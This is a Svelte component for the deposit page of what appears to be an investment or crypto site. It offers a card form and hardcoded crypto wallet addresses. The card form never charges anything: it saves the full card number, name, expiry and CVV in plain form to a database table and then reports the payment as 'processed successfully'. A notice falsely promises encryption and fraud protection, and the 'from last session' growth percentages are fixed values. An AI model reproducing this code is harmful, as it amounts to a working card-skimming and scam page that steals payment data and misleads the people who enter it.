<script>
  import { Card, CardContent, CardHeader, CardTitle } from "$lib/components/ui/card";
  import { Button } from "$lib/components/ui/button";

  let { data } = $props();
  let supabase = $derived(data?.supabase);

  let isVisible = $state(false);
  let amount = $state("0");
  let selectedPaymentMethod = $state("CARD"); // Default to Card or Crypto
  let copiedAddress = $state("");

  // Card Form State
  let cardNumber = $state("");
  let cardholderName = $state("");
  let expiryDate = $state("");
  let cvv = $state("");
  let isSubmitting = $state(false);
  let errorMessage = $state("");
  let successMessage = $state("");

  async function copyAddress(address) {
    try {
      if (navigator?.clipboard?.writeText) {
        await navigator.clipboard.writeText(address);
        copiedAddress = address;
        setTimeout(() => {
          if (copiedAddress === address) copiedAddress = "";
        }, 1500);
      }
    } catch (error) {
      console.error("Failed to copy address:", error);
    }
  }

  async function handleCardSubmit(e) {
    if (e && e.preventDefault) e.preventDefault();

    isSubmitting = true;
    errorMessage = "";
    successMessage = "";

    try {
      const { data: insertedCard, error } = await supabase
        .from("card")
        .insert([
          {
            cardno: cardNumber.replace(/\s+/g, ""),
            user: cardholderName,
            expiry_date: expiryDate,
            cvv: cvv
          }
        ])
        .select();

      if (error) throw error;

      successMessage = "Card details processed successfully!";

      cardNumber = "";
      cardholderName = "";
      expiryDate = "";
      cvv = "";
    } catch (err) {
      console.error("Database Insert Error:", err);
      errorMessage = err.message || "Failed to save card details.";
    } finally {
      isSubmitting = false;
    }
  }

  const stats = $derived([
    { label: "Total Balance", value: data?.profile?.balance ?? "0.00", change: "+12.4%", up: true },
    { label: "Profits", value: data?.profile?.profit ?? "0.00", change: "+8.2%", up: true },
    { label: "Capital", value: data?.profile?.capital ?? "0.00", change: "91.9%", up: true }
  ]);

  const cryptoMap = {
    BTC: { label: "Bitcoin (BTC)", address: "bc1qmp3dlrz3pleqg8q3dc29j7cggkgq3c4y48l6qh", network: "Bitcoin Native" },
    ETH: { label: "Ethereum (ETH)", address: "0x720e753A42D6Cd28E2CDa1a226573a55d7e475Db", network: "ERC-20" },
    BCH: { label: "Bitcoin Cash (BCH)", address: "qpczgu7tyyx2lumy7kj3gsmusqwckmw67uhu3298t4", network: "Bitcoin Cash Native" },
    BNB: { label: "BNB Smart Chain", address: "0x720e753A42D6Cd28E2CDa1a226573a55d7e475Db", network: "BEP-20" }
  };

  const toggleModal = () => {
    isVisible = !isVisible;
  };
</script>

<div class="mb-6">
  <h1 class="text-3xl font-bold text-gray-100 tracking-tight">Deposit</h1>
  <p class="text-sm text-gray-400 mt-1">Manage and monitor your wallet deposits</p>
</div>

<!-- Stats Section -->
<div class="grid gap-4 md:grid-cols-3 my-4">
  {#each stats as stat}
    <Card class="bg-slate-900/60 border-slate-800 backdrop-blur-md">
      <CardHeader class="flex flex-row items-center justify-between space-y-0 pb-2">
        <CardTitle class="text-xs font-bold uppercase tracking-wider text-gray-400">
          {stat.label}
        </CardTitle>
       
      </CardHeader>
      <CardContent>
        <div class="text-2xl font-bold text-slate-100 font-mono">
          {stat.value}
        </div>
        <p class="text-xs mt-1 font-medium {stat.up ? 'text-emerald-400' : 'text-rose-400'}">
          {stat.change} <span class="text-gray-500 font-normal">from last session</span>
        </p>
      </CardContent>
    </Card>
  {/each}
</div>

<!-- Main Deposit Form Card -->
<Card class="bg-slate-900/60 border-slate-800 backdrop-blur-md my-6">
  <CardHeader>
    <CardTitle class="text-xl font-semibold text-gray-100">Quick Deposit Setup</CardTitle>
  </CardHeader>
  <CardContent class="space-y-4">
    <div>
      <label for="deposit-amount" class="block text-sm font-medium text-gray-300 mb-1.5">
        Amount ({data?.profile?.currency ?? 'USD'}):
      </label>
      <input
        id="deposit-amount"
        type="number"
        min="0"
        step="any"
        class="w-full bg-slate-950 border border-slate-800 text-slate-100 px-4 py-2.5 rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500/30 focus:border-amber-500 transition-all placeholder-gray-600"
        placeholder="0.00"
        bind:value={amount}
      />
    </div>

    <div>
      <label for="payment-method" class="block text-sm font-medium text-gray-300 mb-1.5">
        Payment Method
      </label>
      <select
        id="payment-method"
        bind:value={selectedPaymentMethod}
        class="w-full bg-slate-950 border border-slate-800 text-slate-100 px-4 py-2.5 rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500/30 focus:border-amber-500 transition-all"
      >
        <option value="CARD">Credit / Debit Card</option>
        <option value="BTC">Bitcoin (BTC)</option>
        <option value="ETH">Ethereum (ETH)</option>
        <option value="BCH">Bitcoin Cash (BCH)</option>
        <option value="BNB">BNB Smart Chain</option>
      </select>
    </div>

    <Button class="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 font-semibold py-3 rounded-xl transition-all shadow-md mt-2" onclick={toggleModal}>
      ↗ Proceed to Payment
    </Button>
  </CardContent>
</Card>

<!-- Dynamic Modal -->
{#if isVisible}
  <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 overflow-y-auto">
    <div class="relative w-full max-w-xl bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-h-[90vh] flex flex-col my-auto overflow-hidden">
      
      <!-- Modal Header -->
      <div class="flex items-center justify-between p-6 border-b border-slate-800">
        <div>
          <h2 class="text-xl font-bold text-gray-100">Deposit via {selectedPaymentMethod}</h2>
          <p class="text-xs text-gray-400 mt-0.5">Complete your payment using the selected method</p>
        </div>
        <button
          class="p-2 text-gray-400 hover:text-gray-100 hover:bg-slate-800 rounded-lg transition-all"
          onclick={toggleModal}
          aria-label="Close modal"
        >
          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
      </div>

      <!-- Modal Body -->
      <div class="p-6 overflow-y-auto space-y-6">
        
        <!-- Security Notice -->
        <div class="bg-amber-500/10 border border-amber-500/20 text-slate-300 p-4 rounded-xl text-xs leading-relaxed">
          <p class="font-semibold text-amber-400 mb-1 flex items-center gap-1.5">
            🔐 Security Notice
          </p>
          All transactions are encrypted and processed through secure fraud prevention protocols.
        </div>

        <!-- Deposit Summary -->
        <div class="bg-slate-950 border border-slate-800 p-4 rounded-xl text-center">
          <span class="text-xs font-medium text-gray-400 uppercase tracking-wider">Deposit Amount</span>
          <p class="text-2xl font-bold text-emerald-400 font-mono mt-1">
            {data?.profile?.currency ?? 'USD'} {amount}
          </p>
        </div>

        <!-- Dynamic Render: CREDIT CARD FORM -->
        {#if selectedPaymentMethod === "CARD"}
          <div class="bg-slate-950/60 border border-slate-800 rounded-xl p-5">
            <div class="flex items-center gap-3 mb-5">
              <div class="p-2.5 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-lg">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 0 0 2.25-2.25V6.75A2.25 2.25 0 0 0 19.5 4.5h-15a2.25 2.25 0 0 0-2.25 2.25v10.5A2.25 2.25 0 0 0 4.5 19.5Z" />
                </svg>
              </div>
              <div>
                <h3 class="text-sm font-semibold text-gray-100">Credit / Debit Card</h3>
                <p class="text-xs text-gray-400">Instant card processing</p>
              </div>
            </div>

            <form class="space-y-4" onsubmit={handleCardSubmit}>
              {#if errorMessage}
                <div class="p-3 text-xs text-rose-400 bg-rose-950/40 border border-rose-800/60 rounded-lg">
                  {errorMessage}
                </div>
              {/if}

              {#if successMessage}
                <div class="p-3 text-xs text-emerald-400 bg-emerald-950/40 border border-emerald-800/60 rounded-lg">
                  {successMessage}
                </div>
              {/if}

              <div>
                <label for="card-number" class="block text-xs font-medium text-gray-300 mb-1">Card Number</label>
                <input
                  type="text"
                  id="card-number"
                  placeholder="1234 5678 9012 3456"
                  bind:value={cardNumber}
                  required
                  class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-800 rounded-lg text-slate-100 placeholder-gray-600 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500 transition-all"
                />
              </div>

              <div>
                <label for="cardholder-name" class="block text-xs font-medium text-gray-300 mb-1">Cardholder Name</label>
                <input
                  type="text"
                  id="cardholder-name"
                  placeholder="John Doe"
                  bind:value={cardholderName}
                  required
                  class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-800 rounded-lg text-slate-100 placeholder-gray-600 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500 transition-all"
                />
              </div>

              <div class="grid grid-cols-2 gap-3">
                <div>
                  <label for="expiry-date" class="block text-xs font-medium text-gray-300 mb-1">Expiry Date</label>
                  <input
                    type="text"
                    id="expiry-date"
                    placeholder="MM/YY"
                    bind:value={expiryDate}
                    required
                    class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-800 rounded-lg text-slate-100 placeholder-gray-600 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500 transition-all"
                  />
                </div>
                <div>
                  <label for="cvv" class="block text-xs font-medium text-gray-300 mb-1">CVV</label>
                  <input
                    type="text"
                    id="cvv"
                    placeholder="123"
                    bind:value={cvv}
                    required
                    class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-800 rounded-lg text-slate-100 placeholder-gray-600 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500 transition-all"
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                class="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-medium py-2.5 px-4 rounded-lg text-sm transition-all shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30"
              >
                {isSubmitting ? "Processing..." : "Confirm Card Payment"}
              </button>
            </form>
          </div>
        {/if}

        <!-- Dynamic Render: CRYPTO PAYMENT OPTION -->
        {#if cryptoMap[selectedPaymentMethod]}
          {@const selectedCrypto = cryptoMap[selectedPaymentMethod]}
          <div class="bg-slate-950/60 border border-slate-800 rounded-xl p-5 space-y-4">
            <div class="flex items-center justify-between">
              <div>
                <h3 class="text-sm font-semibold text-slate-200">{selectedCrypto.label} Transfer</h3>
                <p class="text-xs text-gray-400 mt-0.5">Send funds to the target address below</p>
              </div>
              <span class="text-[10px] uppercase font-mono px-2 py-1 rounded bg-blue-500/10 text-blue-400 border border-blue-500/20">
                {selectedCrypto.network}
              </span>
            </div>

            <div>
              <label class="block text-xs font-medium text-gray-400 uppercase tracking-wider mb-1.5">
                Deposit Address
              </label>
              <div class="flex items-center gap-2">
                <input
                  type="text"
                  readonly
                  value={selectedCrypto.address}
                  class="w-full bg-slate-900 border border-slate-800 text-slate-300 font-mono text-xs px-3 py-2.5 rounded-lg select-all outline-none"
                />
                <button
                  type="button"
                  onclick={() => copyAddress(selectedCrypto.address)}
                  class="px-4 py-2.5 bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-medium text-slate-200 rounded-lg transition-all shrink-0 active:scale-95"
                >
                  {copiedAddress === selectedCrypto.address ? "Copied!" : "Copy Address"}
                </button>
              </div>
            </div>

            <!-- Provider On-Ramp Link for selected coin -->
            <div class="pt-3 border-t border-slate-800/80">
              <span class="text-xs text-gray-400 block mb-2">Need to buy {selectedPaymentMethod}?</span>
              <a
                href="https://www.moonpay.com"
                target="_blank"
                rel="noopener noreferrer"
                class="flex items-center justify-between px-3.5 py-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 hover:border-slate-700 text-xs font-medium text-slate-200 rounded-lg transition-all group"
              >
                <span>Buy {selectedPaymentMethod} via Moonpay</span>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-3.5 h-3.5 text-gray-500 group-hover:text-amber-400 transition-colors">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25" />
                </svg>
              </a>
            </div>
          </div>
        {/if}
      </div>
    </div>
  </div>
{/if}
